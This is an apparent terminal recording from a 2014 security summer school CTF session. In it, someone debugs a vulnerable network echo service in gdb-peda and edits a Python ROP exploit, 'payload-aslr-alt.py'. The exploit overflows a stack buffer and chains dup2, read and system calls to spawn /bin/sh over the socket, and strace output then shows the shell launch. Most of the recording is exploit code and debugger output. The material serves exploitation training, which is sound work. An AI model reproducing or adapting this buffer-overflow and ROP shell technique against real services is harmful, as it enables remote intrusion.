+[m0004| [;34m0xffffce64[0m --> 0x140 [0m
+[m0008| [;34m0xffffce68[0m --> 0x140 [0m
+[m0012| [;34m0xffffce6c[0m --> 0x5 [0m
+[m0016| [;34m0xffffce70[0m --> 0x4 [0m
+[m0020| [;34m0xffffce74[0m --> 0x3 [0m
+[m0024| [;34m0xffffce78[0m --> 0x167e94 [0m
+[m0028| [;34m0xffffce7c[0m --> 0x167e94 [0m
+[;34m[------------------------------------------------------------------------------][0m
+[mLegend: [;31mcode[0m, [;34mdata[0m, [;32mrodata[0m, value[0m
+
+Breakpoint 2, 0x08048857 in echo_service ()
+[;31mgdb-peda$ [0mpdis
+[mDump of assembler code for function echo_service:
+   0x0804884e <+0>:[m	push   ebp[0m
+   0x0804884f <+1>:[m	mov    ebp,esp[0m
+   0x08048851 <+3>:[m	sub    esp,0x428[0m
+=> 0x08048857 <+9>:[m	mov    DWORD PTR [esp+0x4],0x8048ba0[0m
+   0x0804885f <+17>:[m	mov    eax,DWORD PTR [ebp+0x8][0m
+   0x08048862 <+20>:[m	mov    DWORD PTR [esp],eax[0m
+   0x08048865 <+23>:[;1;4;31m	call   0x8048630 <dprintf@plt>[0m
+   0x0804886a <+28>:[m	mov    DWORD PTR [esp+0x4],0x8048bd0[0m
+   0x08048872 <+36>:[m	mov    eax,DWORD PTR [ebp+0x8][0m
+   0x08048875 <+39>:[m	mov    DWORD PTR [esp],eax[0m
+   0x08048878 <+42>:[;1;4;31m	call   0x8048630 <dprintf@plt>[0m
+   0x0804887d <+47>:[m	mov    DWORD PTR [esp+0x4],0x8048ba0[0m
+   0x08048885 <+55>:[m	mov    eax,DWORD PTR [ebp+0x8][0m
+   0x08048888 <+58>:[m	mov    DWORD PTR [esp],eax[0m
+   0x0804888b <+61>:[;1;4;31m	call   0x8048630 <dprintf@plt>[0m
+   0x08048890 <+66>:[m	mov    DWORD PTR [esp+0x4],0x8048bf0[0m
+   0x08048898 <+74>:[m	mov    eax,DWORD PTR [ebp+0x8][0m
+   0x0804889b <+77>:[m	mov    DWORD PTR [esp],eax[0m
+   0x0804889e <+80>:[;1;4;31m	call   0x8048630 <dprintf@plt>[0m
+   0x080488a3 <+85>:[m	mov    DWORD PTR [esp+0x4],0x8048c30[0m
+   0x080488ab <+93>:[m	mov    eax,DWORD PTR [ebp+0x8][0m
+   0x080488ae <+96>:[m	mov    DWORD PTR [esp],eax[0m
+   0x080488b1 <+99>:[;1;4;31m	call   0x8048630 <dprintf@plt>[0m
+   0x080488b6 <+104>:[m	mov    DWORD PTR [esp+0x8],0x1000[0m
+   0x080488be <+112>:[m	lea    eax,[ebp-0x40c][0m
+   0x080488c4 <+118>:[m	mov    DWORD PTR [esp+0x4],eax[0m
+   0x080488c8 <+122>:[m	mov    eax,DWORD PTR [ebp+0x8][0m
+   0x080488cb <+125>:[m	mov    DWORD PTR [esp],eax[0m
+   0x080488ce <+128>:[;1;4;31m	call   0x8048600 <read@plt>[0m
+   0x080488d3 <+133>:[m	mov    DWORD PTR [ebp-0xc],eax[0m
+   0x080488d6 <+136>:[m	mov    DWORD PTR [esp+0x4],0x8048c7f[0m
+   0x080488de <+144>:[m	mov    eax,DWORD PTR [ebp+0x8][0m
+   0x080488e1 <+147>:[m	mov    DWORD PTR [esp],eax[0m
+   0x080488e4 <+150>:[;1;4;31m	call   0x8048630 <dprintf@plt>[0m
+   0x080488e9 <+155>:[m	mov    eax,DWORD PTR [ebp-0xc][0m
+   0x080488ec <+158>:[m	mov    DWORD PTR [esp+0x8],eax[0m
+   0x080488f0 <+162>:[m	lea    eax,[ebp-0x40c][0m
+   0x080488f6 <+168>:[m	mov    DWORD PTR [esp+0x4],eax[0m
+   0x080488fa <+172>:[m	mov    eax,DWORD PTR [ebp+0x8][0m
+   0x080488fd <+175>:[m	mov    DWORD PTR [esp],eax[0m
+   0x08048900 <+178>:[;32m	call   0x80486b0 <write@plt>[0m
+   0x08048905 <+183>:[m	leave  [0m
+   0x08048906 <+184>:[;34m	ret    [0m
+End of assembler dump.[0m
+[;31mgdb-peda$ [0m0x080488d3b0x080488d3 0x080488d3*0x080488d3
+Breakpoint 3 at 0x80488d3
+[;31mgdb-peda$ [0mb 0x08048906[C[C*0x08048906
+Breakpoint 4 at 0x8048906
+[;31mgdb-peda$ [0mc
+Continuing.
+[;34m[----------------------------------registers-----------------------------------][0m
+[m[;32mEAX[0m: 0x450 
+[;32mEBX[0m: [;34m0xf7f9d000[0m --> 0x1a5da8 
+[;32mECX[0m: [;34m0xffffce7c[0m ('A' <repeats 200 times>...)
+[;32mEDX[0m: 0x1000 
+[;32mESI[0m: 0x0 
+[;32mEDI[0m: 0x0 
+[;32mEBP[0m: [;34m0xffffd288[0m ("AAAA\360\205\004\bn\213\004\b\004")
+[;32mESP[0m: [;34m0xffffce60[0m --> 0x4 
+[;32mEIP[0m: [;31m0x80488d3[0m (<echo_service+133>:	mov    DWORD PTR [ebp-0xc],eax)[0m
+[m[;32mEFLAGS[0m: 0x213 ([;1;31mCARRY[0m [;32mparity[0m [;1;31mADJUST[0m [;32mzero[0m [;32msign[0m [;32mtrap[0m [;1;31mINTERRUPT[0m [;32mdirection[0m [;32moverflow[0m)[0m
+[m[;34m[-------------------------------------code-------------------------------------][0m[0m
+[m   0x80488c8 <echo_service+122>:[;2m	mov    eax,DWORD PTR [ebp+0x8][0m
+   0x80488cb <echo_service+125>:[;2m	mov    DWORD PTR [esp],eax[0m
+   0x80488ce <echo_service+128>:[;2;31m	call   0x8048600 <read@plt>[0m
+=> 0x80488d3 <echo_service+133>:[;1;32m	mov    DWORD PTR [ebp-0xc],eax[0m
+   0x80488d6 <echo_service+136>:[m	mov    DWORD PTR [esp+0x4],0x8048c7f[0m
+   0x80488de <echo_service+144>:[m	mov    eax,DWORD PTR [ebp+0x8][0m
+   0x80488e1 <echo_service+147>:[m	mov    DWORD PTR [esp],eax[0m
+   0x80488e4 <echo_service+150>:[;1;4;31m	call   0x8048630 <dprintf@plt>[0m[0m
+[m[;34m[------------------------------------stack-------------------------------------][0m[0m
+[m0000| [;34m0xffffce60[0m --> 0x4 [0m
+[m0004| [;34m0xffffce64[0m --> [;34m0xffffce7c[0m ('A' <repeats 200 times>...)[0m
+[m0008| [;34m0xffffce68[0m --> 0x1000 [0m
+[m0012| [;34m0xffffce6c[0m --> 0x5 [0m
+[m0016| [;34m0xffffce70[0m --> 0x4 [0m
+[m0020| [;34m0xffffce74[0m --> 0x3 [0m
+[m0024| [;34m0xffffce78[0m --> 0x167e94 [0m
+[m0028| [;34m0xffffce7c[0m ('A' <repeats 200 times>...)[0m
+[;34m[------------------------------------------------------------------------------][0m
+[mLegend: [;31mcode[0m, [;34mdata[0m, [;32mrodata[0m, value[0m
+
+Breakpoint 3, 0x080488d3 in echo_service ()
+[;31mgdb-peda$ [0mc
+Continuing.
+[;34m[----------------------------------registers-----------------------------------][0m
+[m[;32mEAX[0m: 0xffffffff 
+[;32mEBX[0m: [;34m0xf7f9d000[0m --> 0x1a5da8 
+[;32mECX[0m: 0xffffffbc 
+[;32mEDX[0m: 0x450 
+[;32mESI[0m: 0x0 
+[;32mEDI[0m: 0x0 
+[;32mEBP[0m: 0x41414141 ('AAAA')
+[;32mESP[0m: [;34m0xffffd28c[0m --> [;31m0x80485f0[0m (<dup2@plt>:	jmp    DWORD PTR ds:0x804a010)
+[;32mEIP[0m: [;31m0x8048906[0m (<echo_service+184>:	ret)[0m
+[m[;32mEFLAGS[0m: 0x286 ([;32mcarry[0m [;1;31mPARITY[0m [;32madjust[0m [;32mzero[0m [;1;31mSIGN[0m [;32mtrap[0m [;1;31mINTERRUPT[0m [;32mdirection[0m [;32moverflow[0m)[0m
+[m[;34m[-------------------------------------code-------------------------------------][0m[0m
+[m   0x80488fd <echo_service+175>:[;2m	mov    DWORD PTR [esp],eax[0m
+   0x8048900 <echo_service+178>:[;2;32m	call   0x80486b0 <write@plt>[0m
+   0x8048905 <echo_service+183>:[;2m	leave  [0m
+=> 0x8048906 <echo_service+184>:[;1;32m	ret    [0m
+   0x8048907 <doprocessing>:[m	push   ebp[0m
+   0x8048908 <doprocessing+1>:[m	mov    ebp,esp[0m
+   0x804890a <doprocessing+3>:[m	sub    esp,0x18[0m
+   0x804890d <doprocessing+6>:[m	mov    eax,DWORD PTR [ebp+0x8][0m[0m
+[m[;34m[------------------------------------stack-------------------------------------][0m[0m
+[m0000| [;34m0xffffd28c[0m --> [;31m0x80485f0[0m (<dup2@plt>:	jmp    DWORD PTR ds:0x804a010)[0m
+[m0004| [;34m0xffffd290[0m --> [;31m0x8048b6e[0m (<__libc_csu_init+94>:	pop    edi)[0m
+[m0008| [;34m0xffffd294[0m --> 0x4 [0m
+[m0012| [;34m0xffffd298[0m --> 0x0 [0m
+[m0016| [;34m0xffffd29c[0m --> [;31m0x80485f0[0m (<dup2@plt>:	jmp    DWORD PTR ds:0x804a010)[0m
+[m0020| [;34m0xffffd2a0[0m --> [;31m0x8048b6e[0m (<__libc_csu_init+94>:	pop    edi)[0m
+[m0024| [;34m0xffffd2a4[0m --> 0x4 [0m
+[m0028| [;34m0xffffd2a8[0m --> 0x1 [0m
+[;34m[------------------------------------------------------------------------------][0m
+[mLegend: [;31mcode[0m, [;34mdata[0m, [;32mrodata[0m, value[0m
+
+Breakpoint 4, 0x08048906 in echo_service ()
+[;31mgdb-peda$ [0mconte[Kext stack 16
+[m[;34m[------------------------------------stack-------------------------------------][0m[0m
+[m0000| [;34m0xffffd28c[0m --> [;31m0x80485f0[0m (<dup2@plt>:	jmp    DWORD PTR ds:0x804a010)[0m
+[m0004| [;34m0xffffd290[0m --> [;31m0x8048b6e[0m (<__libc_csu_init+94>:	pop    edi)[0m
+[m0008| [;34m0xffffd294[0m --> 0x4 [0m
+[m0012| [;34m0xffffd298[0m --> 0x0 [0m
+[m0016| [;34m0xffffd29c[0m --> [;31m0x80485f0[0m (<dup2@plt>:	jmp    DWORD PTR ds:0x804a010)[0m
+[m0020| [;34m0xffffd2a0[0m --> [;31m0x8048b6e[0m (<__libc_csu_init+94>:	pop    edi)[0m
+[m0024| [;34m0xffffd2a4[0m --> 0x4 [0m
+[m0028| [;34m0xffffd2a8[0m --> 0x1 [0m
+[m0032| [;34m0xffffd2ac[0m --> [;31m0x8048600[0m (<read@plt>:	jmp    DWORD PTR ds:0x804a014)[0m
+[m0036| [;34m0xffffd2b0[0m --> [;31m0x8048b6d[0m (<__libc_csu_init+93>:	pop    esi)[0m
+[m0040| [;34m0xffffd2b4[0m --> 0x4 [0m
+[m0044| [;34m0xffffd2b8[0m --> [;34m0x804a060[0m --> 0x0 [0m
+[m0048| [;34m0xffffd2bc[0m --> 0x8 [0m
+[m0052| [;34m0xffffd2c0[0m --> [;31m0x8048670[0m (<system@plt>:	jmp    DWORD PTR ds:0x804a030)[0m
+[m0056| [;34m0xffffd2c4[0m --> 0x0 [0m
+[m0060| [;34m0xffffd2c8[0m --> [;34m0x804a060[0m --> 0x0 [0m
+[;34m[------------------------------------------------------------------------------][0m
+[mLegend: [;31mcode[0m, [;34mdata[0m, [;32mrodata[0m, value[0m
+[;31mgdb-peda$ [0mc
+Continuing.
+[New process 2331]
+process 2331 is executing new program: /bin/dash
+Warning:
+Cannot insert breakpoint 3.
+Cannot access memory at address 0x80488d3
+Cannot insert breakpoint 4.
+Cannot access memory at address 0x8048906
+
+[;31mgdb-peda$ [0mq
+]0;razvan@einherjar: ~/projects/ctf/sss/summerschool2014.git/sessions/sess-12/sol/echo-servicerazvan@einherjar:~/projects/ctf/sss/summerschool2014.git/sessions/sess-12/sol/echo-service$ gdb -q ./echo_service pkill -9 -f echo_service
+]0;razvan@einherjar: ~/projects/ctf/sss/summerschool2014.git/sessions/sess-12/sol/echo-servicerazvan@einherjar:~/projects/ctf/sss/summerschool2014.git/sessions/sess-12/sol/echo-service$ pkill -9 -f echo_service[2Pgdb -q ./echo_service pkill -9 -f echo_service[2Pgdb -q ./echo_service [1P[1P[1P[1P[1P[1P[1P[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C70101[K
+/bin/sh: 2: os: not found
+^C
+]0;razvan@einherjar: ~/projects/ctf/sss/summerschool2014.git/sessions/sess-12/sol/echo-servicerazvan@einherjar:~/projects/ctf/sss/summerschool2014.git/sessions/sess-12/sol/echo-service$ ./echo_service 7010
+^C
+]0;razvan@einherjar: ~/projects/ctf/sss/summerschool2014.git/sessions/sess-12/sol/echo-servicerazvan@einherjar:~/projects/ctf/sss/summerschool2014.git/sessions/sess-12/sol/echo-service$ vi payload-aslr-alt.py 
+[?1000h[?1049h[?1h=[2;1H▽[6n[2;1H  [1;1H[1;47r[?12;25h[?12l[?25h[27m[23m[m[H[2J[?25l[47;1H"payload-aslr-alt.py" 55L, 1933C[>c[1;1H[34m#!/usr/bin/env python[m
+
+[35mimport[m sys
+[35mimport[m struct
+
+[34m# 0x8048b6e: pop edi; pop ebp; ret[m
+pop_pop_ret = [31m0x8048b6e[m
+[34m# 0x8048b6d: pop esi; pop edi; pop ebp; ret[m
+pop_pop_pop_ret = [31m0x8048b6d[m
+[34m# libc : 0xb7f561a9 ("/bin/sh")[m
+bin_sh = [31m0xb7f561a9[m
+[34m# Symbol "system@plt" is at 0x8048670 in a file compiled without debugging.[m
+system_plt = [31m0x8048670[m
+[34m# Symbol "dup2@plt" is at 0x80485f0 in a file compiled without debugging.[m
+dup2_plt = [31m0x80485f0[m
+[34m# Symbol "read@plt" is at 0x8048600 in a file compiled without debugging.[m
+read_plt = [31m0x8048600[m
+[34m#   [24] .data             PROGBITS        0804a060[m
+data = [31m0x0804a060[m
+
+[34m# Offset from buffer start to function return address is 1040.[m
+payload = [31m1040[m*[31m"A"[m
+
+[34m# Add ROP for dup2(sockfd, 1), i.e. dup2(4, 1):
+#  * address of dup2()
+#  * return address for dup2(): gadget to pop dup2() arguments (pop_pop_ret)
+#  * dup2 arguments: sockfd (4) and standard output (1)[m
+payload += struct.pack([31m"<IIII"[m, dup2_plt, pop_pop_ret, [31m4[m, [31m0[m)
+
+[34m# Add ROP for dup2(sockfd, 0), i.e. dup2(4, 0):
+#  * address of dup2()
+#  * return address for dup2(): gadget to pop dup2() arguments (pop_pop_ret)
+#  * dup2 arguments: sockfd (4) and standard input (0)[m
+payload += struct.pack([31m"<IIII"[m, dup2_plt, pop_pop_ret, [31m4[m, [31m1[m)
+
+[34m# Add ROP for read(sockfd, data, len), i.e. read(4, 0x0804a060, 8)
+#  * address of read()
+#  * return addres of read(): gadget to pop read(arguments) (pop_pop_pop_ret)
+#  * read arguments: 4, data address, 8 bytes for /bin/sh\n[m
+payload += struct.pack([31m"<IIIII"[m, read_plt, pop_pop_pop_ret, [31m4[m, data, [31m8[m)
+
+[34m# Add ROP for system("/bin/sh")
+#  * address of dup2()
+#  * return address for system(): we don't care, just use zero
+#  * system argument: address of "/bin/sh"[m
+payload += struct.pack([31m"<III"[m, system_plt, [31m0[m, data)[47;160H21,1[10CTop]2;payload-aslr-alt.py (~/projects/ctf/sss/summerschool2014.git/sessions/sess-12/sol/echo-service) - VIM]1;payload-aslr-alt.py[21;1H[?12l[?25h[?1000l[?1006h[?1002h[?1006l[?1002l[?1006h[?1002hP+q436f\P+q6b75\P+q6b64\P+q6b72\P+q6b6c\P+q2332\P+q2334\P+q2569\P+q2a37\P+q6b31\[?25l[47;150H^F[21;1H[47;150H  [1;1H[27m[23m[m[H[2J[1;1H[34m#  * system argument: address of "/bin/sh"[m
+payload += struct.pack([31m"<III"[m, system_plt, [31m0[m, data)
+
+[34m# Fill 4096 bytes to complete read() call.[m
+bytes_so_far = [36mlen[m(payload)
+payload += ([31m4096[m-bytes_so_far)*[31m"[m[35m\0[m[31m"[m
+
+[34m# Send "/bin/sh\0" string to ROP-infused read() call.[m
+payload += [31m"/bin/sh[m[35m\0[m[31m"[m
+
+sys.stdout.write(payload)
+[1m[34m~                                                                                                                                                                                [13;1H~                                                                                                                                                                                [14;1H~                                                                                                                                                                                [15;1H~                                                                                                                                                                                [16;1H~                                                                                                                                                                                [17;1H~                                                                                                                                                                                [18;1H~                                                                                                                                                                                [19;1H~                                                                                                                                                                                [20;1H~                                                                                                                                                                                [21;1H~                                                                                                                                                                                [22;1H~                                                                                                                                                                                [23;1H~                                                                                                                                                                                [24;1H~                                                                                                                                                                                [25;1H~                                                                                                                                                                                [26;1H~                                                                                                                                                                                [27;1H~                                                                                                                                                                                [28;1H~                                                                                                                                                                                [29;1H~                                                                                                                                                                                [30;1H~                                                                                                                                                                                [31;1H~                                                                                                                                                                                [32;1H~                                                                                                                                                                                [33;1H~                                                                                                                                                                                [34;1H~                                                                                                                                                                                [35;1H~                                                                                                                                                                                [36;1H~                                                                                                                                                                                [37;1H~                                                                                                                                                                                [38;1H~                                                                                                                                                                                [39;1H~                                                                                                                                                                                [40;1H~                                                                                                                                                                                [41;1H~                                                                                                                                                                                [42;1H~                                                                                                                                                                                [43;1H~                                                                                                                                                                                [44;1H~                                                                                                                                                                                [45;1H~                                                                                                                                                                                [46;1H~                                                                                                                                                                                [m[47;160H45,1[10CBot[1;1H[?12l[?25h[?25l[47;150Hj[1;1H[47;150H [2;1H[47;161H6[2;1H[?12l[?25h[?25l[47;150Hj[2;1H[47;150H [3;1H[47;161H7,0-1[3;1H[?12l[?25h[?25l[47;150Hj[3;1H[47;150H [4;1H[47;161H8,1  [4;1H[?12l[?25h[?25l[47;150Hj[4;1H[47;150H [5;1H[47;161H9[5;1H[?12l[?25h[?25l[47;150Hj[5;1H[47;150H [6;1H[47;160H50[6;1H[?12l[?25h[?25l[47;150H$[6;1H[47;150H [6;35H[47;163H35[6;35H[?12l[?25h[?25l[47;150Hh[6;35H[47;150H [6;34H[47;164H4[6;34H[?12l[?25h[?25l[47;150Hh[6;34H[47;150H [6;33H[47;164H3[6;33H[?12l[?25h[?25l[47;150Hx[6;33H[47;150H [6;33H[47;150Hdl[6;33H[47;150H  [6;33H[31m0"[m[6;35H[K]2;payload-aslr-alt.py + (~/projects/ctf/sss/summerschool2014.git/sessions/sess-12/sol/echo-service) - VIM]1;payload-aslr-alt.py[6;33H[?12l[?25h[?25l[47;150Hx[6;33H[47;150H [6;33H[47;150Hdl[6;33H[47;150H  [6;33H[31m"[m[6;34H[K[6;33H[?12l[?25h[?25l[47;150Hi[6;33H[47;150H [6;33H[47;1H[1m-- INSERT --[m[47;160H[K[47;160H50,33[9CBot[6;33H[?12l[?25h[?25l[31mA"[m[47;164H4[6;34H[?12l[?25h[47;1H[K[6;33H[?25l[47;150H^[[6;33H[?12l[?25h[?25l[47;150H  [6;34H[47;160H50,33[9CBot[6;33H[?12l[?25h[?25l[47;150H:[6;33H[47;150H[K[47;1H:[?12l[?25hw[?25l[?12l[?25hq[?25l[?12l[?25h[?25l[?1006l[?1002l"payload-aslr-alt.py" 55L, 1932C written]2;razvan@einherjar: ~/projects/ctf/sss/summerschool2014.git/sessions/sess-12/sol/echo-service]1;razvan@einherjar: ~/projects/ctf/sss/summerschool2014.git/sessions/sess-12/sol/echo-service
+[?1l>[?12l[?25h[?1049l]0;razvan@einherjar: ~/projects/ctf/sss/summerschool2014.git/sessions/sess-12/sol/echo-servicerazvan@einherjar:~/projects/ctf/sss/summerschool2014.git/sessions/sess-12/sol/echo-service$ ./echo_service 70101[K
+^C
+]0;razvan@einherjar: ~/projects/ctf/sss/summerschool2014.git/sessions/sess-12/sol/echo-servicerazvan@einherjar:~/projects/ctf/sss/summerschool2014.git/sessions/sess-12/sol/echo-service$ ./echo_service 7010[K1[1@s[1@t[1@r[1@a[1@c[1@e[1@ [1@-[1@e[1@ [1@e[1@x[1@e[1@c[1@v[1@e[1@ 
+execve("./echo_service", ["./echo_service", "7011"], [/* 35 vars */]) = 0
+[ Process PID=14850 runs in 32 bit mode. ]
+^CProcess 14850 detached
+]0;razvan@einherjar: ~/projects/ctf/sss/summerschool2014.git/sessions/sess-12/sol/echo-servicerazvan@einherjar:~/projects/ctf/sss/summerschool2014.git/sessions/sess-12/sol/echo-service$ strace -e execve ./echo_service 7011[C[C[C[C[C[C[C[1@ [1@f[1P[1@-[1@f
+execve("./echo_service", ["./echo_service", "7011"], [/* 35 vars */]) = 0
+[ Process PID=14923 runs in 32 bit mode. ]
+Process 15032 attached
+Process 15033 attached
+[pid 15033] execve("/bin/sh", ["sh", "-c", "/bin/sh"], [/* 344 vars */]) = -1 EFAULT (Bad address)
+[pid 15033] +++ exited with 127 +++
+[pid 15032] --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=15033, si_uid=1000, si_status=127, si_utime=0, si_stime=0} ---
+[pid 15032] --- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0} ---
+[pid 15032] +++ killed by SIGSEGV +++
+--- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_KILLED, si_pid=15032, si_uid=1000, si_status=SIGSEGV, si_utime=0, si_stime=0} ---
+^CProcess 14923 detached
+]0;razvan@einherjar: ~/projects/ctf/sss/summerschool2014.git/sessions/sess-12/sol/echo-servicerazvan@einherjar:~/projects/ctf/sss/summerschool2014.git/sessions/sess-12/sol/echo-service$ vi [K[K[Kstrace -f -e execve ./echo_service 7011[3P[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[17P./echo_service 7010
+^C
+]0;razvan@einherjar: ~/projects/ctf/sss/summerschool2014.git/sessions/sess-12/sol/echo-servicerazvan@einherjar:~/projects/ctf/sss/summerschool2014.git/sessions/sess-12/sol/echo-service$ exit
+
+Script done on Sat 25 Jul 2015 01:35:08 AM EEST
